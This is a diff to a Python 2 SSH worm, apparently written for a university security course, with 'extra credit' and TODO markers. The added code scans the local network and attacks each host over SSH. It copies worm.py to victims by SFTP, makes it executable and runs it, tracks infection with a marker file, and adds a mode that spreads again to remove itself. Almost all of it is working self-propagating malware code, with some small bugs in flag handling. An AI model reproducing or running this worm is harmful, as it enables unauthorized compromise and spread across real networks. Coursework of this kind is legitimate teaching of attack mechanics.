@@ -59,10 +59,8 @@ def spreadAndExecute(sshClient):
 	sftpClient.put("worm.py", "/tmp/worm.py")
 	sftpClient.close()
 	sshClient.exec_command("chmod a+rwx /tmp/worm.py")
-	output = sshClient.exec_command("python /tmp/worm.py")[1]
-	for line in output:
-		print line	
-	pass
+	sshClient.exec_command("python /tmp/worm.py")
+
 
 
 ############################################################
@@ -177,6 +175,46 @@ def getHostsOnTheSameNetwork():
 	hostInfo = portScanner.all_hosts()
 	return hostInfo
 
+#!!!!!!!!!!!!!!extra credit!!!!!!!!!!!!!!!!!!!!!!!!!!!
+def spreadAndRemove():
+	print 'Running in remove mode'
+	networkHosts = getHostsOnTheSameNetwork()
+	print 'found hosts: '
+	print networkHosts
+	interface_list = netinfo.list_devs()[0]
+	interface = None
+	print interface_list
+	for i in interface_list:
+		if i == "enp0s3":
+			interface = i  
+	myIp = getMyIP("enp0s3")
+	if networkHosts is not None:
+		for host in networkHosts:			
+			if host == myIp:
+				networkHosts.remove(host)
+		for host in networkHosts:	
+			sshInfo = attackSystem(host)
+			print sshInfo
+			if sshInfo:
+				print 'trying to spread'
+				try:
+					remotepath = '/tmp/infected.txt'
+					localpath = '/home/infectCheck.txt'
+					sftpClient = sshInfo[0].open_sftp()
+					sshClient = sshInfo[0]
+					sftpClient.get(remotepath, localpath)
+					sftpClient = sshClient.open_sftp()
+					sftpClient.put("worm.py", "/tmp/worm.py")
+					sftpClient.close()
+					sshClient.exec_command("chmod a+rwx /tmp/worm.py")
+					sshClient.exec_command("rm /tmp/infected.txt")
+					sshClient.exec_command("python /tmp/worm.py r")
+					sshClient.exec_command("rm /tmp/worm.py")
+				except Exception as e:
+					print e	
+					print 'System not infected'
+#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
 # will act maliciously. This way, when you initially run the 
@@ -185,66 +223,82 @@ def getHostsOnTheSameNetwork():
 # on attackers system. If you do not like this approach,
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
-# system against the hardcoded IP. 
-if len(sys.argv) <= 1:
-	# TODO: If we are running on the victim, check if 
-	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice.
-	if (os.path.isfile("/tmp/infected.txt")):
-		print "EXIT"		
-		exit()
-	# TODO: Get the IP of the current system	
-	markInfected()
-	interface = netinfo.list_devs()[0]
-	myIp = getMyIP(interface)
+# system against the hardcoded IP.
+origin_mode = False
+if len(sys.argv) > 1:
+		if sys.argv[1] is 'o':
+			print "Running on origin system"
+			origin_mode is True
+		elif sys.argv[1] is 'r':
+			spreadAndRemove()
+			exit()
+		else:
+			print sys.argv[1] + ' is not a valid flag'
+			exit()
+else:
 	
-	# Get the hosts on the same network
-	networkHosts = getHostsOnTheSameNetwork()
+		# TODO: If we are running on the victim, check if 
+		# the victim was already infected. If so, terminate.
+		# Otherwise, proceed with malice.
+	if (isInfectedSystem()):
+		print "System already infected"		
+		exit()
+if not origin_mode:
+	markInfected()
 
-	# TODO: Remove the IP of the current system
-	# from the list of discovered systems (we
-	# do not want to target ourselves!).
+# TODO: Get the IP of the current system	
+myIp = getMyIP("enp0s3")
 
-	if networkHosts is not None:
-		for host in networkHosts:
-			if host == myIp:
-				networkHosts.remove(host)
-		print "Found hosts: ", networkHosts
-		# Go through the network hosts
-		for host in networkHosts:
-			# Try to attack this host
-			sshInfo =  attackSystem(host)
-			print sshInfo
-			# Did the attack succeed?
-			if sshInfo:
-				print "Trying to spread"
-				# TODO: Check if the system was
-				# already infected. This can be
-				# done by checking whether the
-				# remote system contains /tmp/infected.txt
-				# file (which the worm will place there
-				# when it first infects the system)
-				# This can be done using code similar to
-				# the code below:
-				try:
-					remotepath = '/tmp/infected.txt'
-					localpath = '/home/cpsc/'
-				#	 # Copy the file from the specified
-				#	 # remote path to the specified
-				# 	 # local path. If the file does exist
-				#	 # at the remote path, then get()
-				# 	 # will throw IOError exception
-				# 	 # (that is, we know the system is
-				# 	 # not yet infected).
-					sftpClient = sshInfo[0].open_sftp()
-					sftpClient.get(remotepath, localpath)
-				except IOError:
-					print "This system should be infected"
-					spreadAndExecute(sshInfo[0])
-					sshInfo[0].close()
-					print "System infected"
-				#
-				#
-				# If the system was already infected proceed.
-				# Otherwise, infect the system and terminate.
-				# Infect that system
+# Get the hosts on the same network
+networkHosts = getHostsOnTheSameNetwork()
+
+# TODO: Remove the IP of the current system
+# from the list of discovered systems (we
+# do not want to target ourselves!).
+
+if networkHosts is not None:
+	for host in networkHosts:
+		if host == myIp:
+			networkHosts.remove(host)
+	print "Found hosts: ", networkHosts
+
+	# Go through the network hosts
+	for host in networkHosts:
+
+	# Try to attack this host
+		sshInfo =  attackSystem(host)
+		print sshInfo
+
+		# Did the attack succeed?
+		if sshInfo:
+			print "Trying to spread"
+			# TODO: Check if the system was
+			# already infected. This can be
+			# done by checking whether the
+			# remote system contains /tmp/infected.txt
+			# file (which the worm will place there
+			# when it first infects the system)
+			# This can be done using code similar to
+			# the code below:
+			try:
+				remotepath = '/tmp/infected.txt'
+				localpath = '/home/infectCheck.txt'
+			#	 # Copy the file from the specified
+			#	 # remote path to the specified
+			# 	 # local path. If the file does exist
+			#	 # at the remote path, then get()
+			# 	 # will throw IOError exception
+			# 	 # (that is, we know the system is
+			# 	 # not yet infected).
+				sftpClient = sshInfo[0].open_sftp()
+				sftpClient.get(remotepath, localpath)
+			except IOError:
+				print "This system should be infected"
+				spreadAndExecute(sshInfo[0])
+				sshInfo[0].close()
+				print "System infected"
+			#
+			#
+			# If the system was already infected proceed.
+			# Otherwise, infect the system and terminate.
+			# Infect that system	
